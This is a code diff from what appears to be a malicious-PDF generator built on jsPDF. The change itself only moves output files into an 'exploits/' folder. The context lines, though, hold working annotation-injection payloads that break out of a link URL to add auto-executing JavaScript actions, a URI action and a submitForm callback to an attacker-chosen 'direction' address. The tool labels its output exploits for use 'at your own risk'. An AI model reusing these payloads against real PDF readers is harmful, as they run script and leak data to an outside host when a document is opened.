@@ -13,7 +13,7 @@ class jsPDF_template{
 		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
 		type:'link',url:`/) >> >><</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});
 		this.doc.text(20, 20, 'Execute automatically');
-		out_name = out_name + ".pdf"
+		out_name = "exploits/" + out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
 		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
@@ -26,7 +26,7 @@ class jsPDF_template{
 		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
 		type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});
 		this.doc.text(20, 20, 'Test text');
-		out_name = out_name + ".pdf"
+		out_name = "exploits/" + out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
 		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
@@ -37,7 +37,7 @@ class jsPDF_template{
 		this.doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},
 		type:'link',url:`/blah)>>/A<</S/URI/URI(`+direction+`)/Type/Action>>/F 0>>(`});
 		this.doc.text(20, 20, 'Test text');
-		out_name = out_name + ".pdf"
+		out_name = "exploits/" + out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
 		console.log("[*] This exploit is not stealthy, use at your own risk \n\tUse -L to list stealthy exploits")
@@ -53,7 +53,7 @@ class jsPDF_template{
 		this.submitForm(`+direction+`, false, false, ['Title']);
 		)/(`});
 		this.doc.text(20, 20, 'Test text');
-		out_name = out_name + ".pdf"
+		out_name = "exploits/" + out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
 		return [out_name, this.state, direction];
@@ -76,7 +76,7 @@ class jsPDF_template{
 		this.doc.text(20, 20, 'Click me test');
 		this.doc.text(20, 40, 'Abc Def');
 		this.doc.text(20, 60, 'Some word');
-		out_name = out_name + ".pdf"
+		out_name = "exploits/" + out_name + ".pdf"
 		this.doc.save(out_name);
 		this.state = 1
 		return [out_name, this.state, direction];
